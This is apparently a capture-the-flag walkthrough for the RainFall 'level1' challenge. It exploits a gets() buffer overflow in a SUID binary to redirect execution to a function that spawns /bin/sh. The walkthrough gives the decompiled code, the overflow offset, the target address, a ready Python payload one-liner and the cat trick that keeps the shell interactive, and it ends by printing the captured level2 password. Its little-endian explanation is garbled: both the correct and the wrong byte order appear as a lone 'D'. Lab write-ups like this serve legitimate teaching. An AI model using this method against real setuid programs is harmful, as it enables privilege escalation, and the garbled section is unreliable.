## Level 1 Walkthrough

### Who am I?

```bash
level1@RainFall:~$ id
uid=2001(level1) gid=2001(level1) groups=2001(level1)
```

### Where am I?

```bash
level1@RainFall:~$ ll
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

We are in possession of a SUID binary owned by `level2`. Our objective is to exploit this binary to gain a shell as `level2` and read the corresponding `.pass` file.

---

## Program Behavior

The program accepts input from stdin and immediately returns. It does not provide any feedback, which suggests that its behavior is silent unless something specific is triggered.

Here are a few examples:

```bash
level1@RainFall:~$ ./level1
hello
level1@RainFall:~$ ./level1
123
level1@RainFall:~$ echo "test" | ./level1
level1@RainFall:~$
```

In each case, the program accepts the input and exits quietly, without printing anything or showing an error message. This confirms that it expects a very specific input or is relying on hidden internal logic.

---

## Static Analysis (Ghidra)

Using Ghidra, we observe two key functions:

### `void run(void)`

```c
void run(void)
{
  fwrite("Good... Wait what?\n", 1, 19, stdout);
  system("/bin/sh");
}
```

This function prints a message and attempts to spawn a shell.

### `void main(void)`

```c
void main(void)
{
  char buffer[76];
  gets(buffer);
}
```

The use of `gets()` is unsafe, as it does not check the length of user input. This presents a classic buffer overflow opportunity.

---

## Exploitation Strategy

### Step 1: Identify the overflow offset

We want to find how many bytes it takes to reach and overwrite the return address. Using trial and error or pattern generation, we determine this offset is **76 bytes**.

### Step 2: Find `run()` address

Using GDB:

```bash
(gdb) p &run
$1 = (<text variable, no debug info> *) 0x8048444 <run>
```

### Step 3: Craft the payload

Before building the payload, it is important to understand how memory addresses are represented in this architecture.

#### Why little-endian?

The system we're exploiting runs on an **x86 (i386)** architecture, which uses **little-endian** byte ordering. This means that when a multi-byte value (like an address) is stored in memory, its **least significant byte (LSB)** is stored first.

For example, if the address of `run()` is:

```
0x08048444
```

Then it must be written in memory as:

```
D
```

This is because memory reads the bytes from lowest to highest address, and in little-endian systems, the LSB comes first.

If you were to write it as `D`, it would actually represent a totally different address (0x44840408), and your exploit would fail.

* 76 bytes of filler (e.g. "A" \* 76)
* Address of `run()` in little-endian format: `\x44\x84\x04\x08`

```bash
python -c 'print("A" * 76 + "\x44\x84\x04\x08")' > /tmp/exploit
```

### Step 4: Make the shell interactive

If we run:

```bash
level1@RainFall:~$ cat /tmp/exploit | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

The message "Good... Wait what?" confirms that the `run()` function was successfully invoked, but the shell dies immediately afterward. This happens because the pipe (`|`) closes the standard input (`stdin`) of the child process.

As a result, the shell spawned by `system("/bin/sh")` cannot read input and exits instantly.

To fix this, we use `-` with the `cat` command. This tells `cat` to concatenate both `/tmp/exploit` **and** the terminal's `stdin`, so that `./level1` receives the exploit payload and can still read from user input afterward:

```bash
cat /tmp/exploit - | ./level1
```

This keeps the shell open and interactive.

### Step 5: Validate access

```bash
$ whoami
level2
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Files in this repository

```
* `flag.txt` file containing the retrieved flag  
* `asm_analysis.md` GDB analysis of the binary  
* `decompiled_level0/` folder containing the reconstructed C code from Ghidra  
```

